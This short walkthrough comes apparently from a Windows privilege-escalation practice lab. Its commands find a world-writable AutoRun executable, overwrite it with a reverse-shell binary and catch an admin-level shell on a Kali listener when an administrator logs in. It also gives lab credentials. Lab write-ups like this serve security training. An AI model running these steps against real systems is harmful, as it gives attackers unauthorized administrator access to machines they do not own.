1. Query the registry for AutoRun executables:
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

2. Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

3. Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

4. Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
